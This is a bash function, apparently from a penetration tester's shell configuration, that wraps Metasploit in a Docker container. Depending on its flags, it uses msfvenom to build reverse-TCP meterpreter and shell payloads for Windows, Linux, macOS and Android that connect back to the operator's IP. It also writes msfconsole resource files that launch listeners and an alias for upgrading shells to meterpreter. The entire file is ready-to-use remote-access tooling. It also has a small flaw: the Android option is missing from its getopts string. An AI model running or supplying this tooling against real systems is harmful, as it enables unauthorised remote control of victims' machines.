alias msfconsole='msf_start'
function msf_start() {
tmuxwindowname=$(tmux display-message -p '#W')
tmux rename-window -t${TMUX_PANE} "msf"
tmuxwindownamebuild=$(tmux display-message -p '#W')
while getopts d:n:p:huwlo option
do
	case "${option}" in
		d)
			desktopfolder=${OPTARG}
			;;
		n) 
			netiface=${OPTARG}
			hostip="$(ipconfig getifaddr $netiface)"
			;;
		p) 
			exploitport=$OPTARG
			;;
		u)
			shellupgradeport=$OPTARG
			;;
		a)
			andpay=1
			tmuxwindownamebuild=$(echo $tmuxwindownamebuild)" [android]"
			;;
		w)
			winpay=1
			tmuxwindownamebuild=$(echo $tmuxwindownamebuild)" [win]"
			;;
		l)
			linpay=1
			tmuxwindownamebuild=$(echo $tmuxwindownamebuild)" [lin]"
			;;
		o)
			osxpay=1
			tmuxwindownamebuild=$(echo $tmuxwindownamebuild)" [osx]"
			;;
		h)
			echo "msfconsole docker image start script help"
			echo "--------------------------------------------"
			echo "-d	<Desktop Folder>"
			echo "-n	<Network iface>"
			echo "-p	<Lisener Port>"
			echo "-u	<Shell Upgrade Port>"
			echo "-w	<Windows Reverse Lisener>"
			echo "-l	<Linux Reverse Lisener>"
			echo "-o	<OSX Reverse Lisener>"
			tmux rename-window -t${TMUX_PANE} $tmuxwindowname
			return 0
			;;
	esac
done

if [ -z $shellupgradeport ]; then
	shellupgradeport=4433
fi

tmuxwindownamebuild=$(echo $tmuxwindownamebuild)" (p="$(echo $exploitport)" u="$(echo $shellupgradeport)")"
tmux rename-window -t${TMUX_PANE} $tmuxwindownamebuild

# start bash ports forwarding and shared folders
msf="$(docker run -d -t \
	-p $exploitport:$exploitport \
	-p 80:80 \
	-p 3000:3000 \
	-p $shellupgradeport:$shellupgradeport \
	-p 443:443 \
	-v $desktopfolder:/pentest/Desktop \
	pennoser/msf:latest /bin/bash)"

# build basic reverse payloads for host
if [ -n "$andpay" ]; then
	docker exec -ti $msf msfvenom \
		-p "android/meterpreter/reverse_tcp" \
		"LHOST=$hostip" \
		"LPORT=$exploitport" \
		-f "apk" \
		-o "/pentest/Desktop/shell.apk"
fi
if [ -n "$winpay" ]; then
	docker exec -ti $msf msfvenom \
		-p "windows/meterpreter/reverse_tcp" \
		"LHOST=$hostip" \
		"LPORT=$exploitport" \
		-f "exe" \
		-o "/pentest/Desktop/shell.exe"
fi
if [ -n "$linpay" ]; then
	docker exec -ti $msf msfvenom \
		-p "linux/x86/meterpreter/reverse_tcp" \
		"LHOST=$hostip" \
		"LPORT=$exploitport" \
		-f "elf" \
		-o "/pentest/Desktop/shell"
	docker exec -ti $msf /bin/bash \
		-c "chmod +x /pentest/Desktop/shell"
fi
if [ -n "$osxpay" ]; then
	docker exec -ti $msf msfvenom \
		-p "osx/x86/shell_reverse_tcp" \
		"LHOST=$hostip" \
		"LPORT=$exploitport" -f \
		"macho" -o "/pentest/Desktop/shell.command"
	docker exec -ti $msf /bin/bash \
		-c "chmod +x /pentest/Desktop/shell.command"
fi

# setup msfconsole startup
docker exec -t $msf /bin/bash \
	-c "echo alias upgrade 'use post/multi/manage/shell_to_meterpreter LPORT=$shellupgradeport' >> /root/.msf4/msfconsole.rc"
docker exec -t $msf /bin/bash \
	-c "echo set lport $exploitport >> /root/.msf4/linpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo exploit -j >> /root/.msf4/linpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo set lport $exploitport >> /root/.msf4/winpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo exploit -j >> /root/.msf4/winpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo set lport $exploitport >> /root/.msf4/osxpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo exploit -j >> /root/.msf4/osxpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo clear >> /root/.msf4/msfconsole.rc"
docker exec -t $msf /bin/bash \
	-c "echo set -g LHOST $hostip >> /root/.msf4/msfconsole.rc"

# run msfconsole
docker exec -ti $msf msf 

# cleanup
docker container stop $msf
docker container rm $msf
rm $desktopfolder/shell*
desktopfolder=''
netiface=''
hostip=''
exploitport=''
shellupgradeport=''
winpay=''
linpay=''
osxpay=''
tmux rename-window -t${TMUX_PANE} $tmuxwindowname
}

